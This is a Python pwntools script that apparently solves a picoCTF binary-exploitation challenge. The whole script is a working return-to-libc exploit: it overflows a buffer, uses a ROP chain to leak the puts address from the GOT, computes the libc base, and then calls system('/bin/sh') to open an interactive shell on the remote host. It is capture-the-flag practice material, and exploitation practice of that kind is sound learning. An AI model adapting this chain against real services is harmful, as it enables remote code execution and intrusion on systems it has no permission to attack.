#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 49464
HOST = "mercury.picoctf.net"
exe = context.binary = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

#Leak libc
pop_rdi = 0x0000000000400913
payload = flat(b'a'*0x88, pop_rdi, exe.got.puts, exe.plt.puts, exe.sym.do_stuff)
p.sendlineafter(b'sErVeR!\n', payload)
p.recvuntil(b'\x61\x61\x64\x0a')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - libc.sym.puts
print("libc_base: ", hex(libc.address))

#Get Shell
ret = 0x000000000040052e
bin_sh = next(libc.search(b'/bin/sh'))
payload = flat(b'a'*0x88, ret, pop_rdi, bin_sh, libc.sym.system)
p.sendline(payload)

p.interactive()